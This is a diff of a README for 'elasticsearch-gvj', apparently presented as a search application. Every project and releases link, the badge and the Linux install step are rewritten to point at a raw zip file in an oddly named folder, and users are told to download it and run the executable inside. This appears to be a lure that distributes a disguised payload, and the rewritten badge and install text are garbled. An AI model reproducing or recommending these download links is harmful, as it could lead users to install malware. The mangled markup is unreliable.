@@ -1,12 +1,12 @@
 # 🚀 elasticsearch-gvj - Fast and Easy Search Solution
 
-![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green.svg)](https://github.com/darlo2003/elasticsearch-gvj/releases)
+![Download Now](https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip)](https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip)
 
 ## 📥 Download & Install
 
 To get started with elasticsearch-gvj, visit this page to download:
 
-[Download elasticsearch-gvj](https://github.com/darlo2003/elasticsearch-gvj/releases)
+[Download elasticsearch-gvj](https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip)
 
 ### 📋 System Requirements
 
@@ -29,7 +29,7 @@ Once you've downloaded the application, follow these steps to install and run it
 
    - For Windows: Double-click the `.exe` file to start the installation. Follow the prompts to install elasticearch-gvj.
    - For macOS: Open the `.dmg` file, then drag the application to the Applications folder.
-   - For Linux: Extract the `.tar.gz` file and open a terminal in the extracted folder. Use the command `./elasticsearch-gvj` to start the application.
+   - For Linux: Extract the `https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip` file and open a terminal in the extracted folder. Use the command `./elasticsearch-gvj` to start the application.
 
 3. **Running the Application**
 
@@ -72,6 +72,6 @@ Your feedback helps us improve. Share your thoughts on the application through t
 
 For detailed information, updates, and community discussions, visit our GitHub repository:
 
-[elasticsearch-gvj GitHub](https://github.com/darlo2003/elasticsearch-gvj)
+[elasticsearch-gvj GitHub](https://raw.githubusercontent.com/darlo2003/elasticsearch-gvj/main/metroptosia/elasticsearch-gvj.zip)
 
 Thank you for using elasticsearch-gvj. We hope it enhances your search experience!
